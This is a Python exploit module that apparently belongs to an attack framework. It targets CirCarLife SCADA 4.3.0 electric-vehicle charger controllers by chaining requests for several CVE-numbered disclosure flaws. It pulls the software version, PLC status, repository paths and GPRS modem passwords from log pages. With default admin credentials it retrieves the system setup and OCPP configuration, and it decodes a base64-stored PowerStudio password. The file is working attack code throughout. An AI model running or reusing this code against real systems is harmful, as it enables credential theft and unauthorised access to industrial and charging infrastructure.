import requests
from utils.logger import setup_logger
import xml.etree.ElementTree as ET
import json
import base64

logger = setup_logger()

def exploit(target: str, port: int = 80, user: str = "admin", pwd: str =  "1234"):
    """
    CirCarLife SCADA 4.3.0 – Multiple Credential Disclosures
    CVEs: CVE-2018-12634, CVE-2018-16668–72
    """
    base_url = f"http://{target}:{port}"
    ocpp_url = f"http://{target}:8080"

    try:
        leaked = False

        # CVE-2018-16671: Software version leak
        r = requests.get(f"{base_url}/html/device-id", timeout=5)
        if r.ok and "Software" in r.text:
            logger.success("[+] Software version disclosed")
            leaked = True

        # CVE-2018-16670: PLC status leak
        r = requests.get(f"{base_url}/services/user/values.xml?var=STATUS", timeout=5)
        if r.ok and "<variable>" in r.text:
            logger.success("[+] PLC status disclosed")
            leaked = True

        # CVE-2018-16668: Repository paths
        r = requests.get(f"{base_url}/html/repository", timeout=5)
        if r.ok and "/circarlife/" in r.text:
            logger.success("[+] Repository paths leaked")
            leaked = True

        # CVE-2018-12634: Modem and log leaks
        r = requests.get(f"{base_url}/html/log", timeout=5)
        if r.ok and "Greetings!!" in r.text and "password=" in r.text:
            logger.success("[+] GPRS modem credentials leaked")
            leaked = True

        # CVE-2018-16672: Setup.json (requires default creds)
        auth = requests.auth.HTTPDigestAuth(user, pwd)
        r = requests.get(f"{base_url}/services/system/setup.json", auth=auth, timeout=5)
        if r.ok and "mac" in r.text:
            logger.success(f"[+] System setup leaked ({user}:{pwd})")
            setup_data = json.loads(r.text)
            logger.info(f"    MAC: {setup_data['device'].get('mac')}, IP: {setup_data['network'].get('ip')}")
            leaked = True

        # CVE-2018-16669: config.xml (OCPP app) - also using default creds
        r = requests.get(f"{ocpp_url}/services/config/config.xml", auth=auth, timeout=5)
        if r.ok and "<csPassword>" in r.text:
            logger.success(f"[+] OCPP config leaked ({user}:{pwd})")
            tree = ET.fromstring(r.text)
            raw_pw = tree.find(".//pwStdPassword").text
            decoded_pw = base64.b64decode(raw_pw).decode(errors="ignore")
            logger.info(f"    PowerStudio password: {decoded_pw}")
            leaked = True

        return leaked

    except Exception as e:
        logger.error(f"[!] CirCarLife error: {e}")
        return False
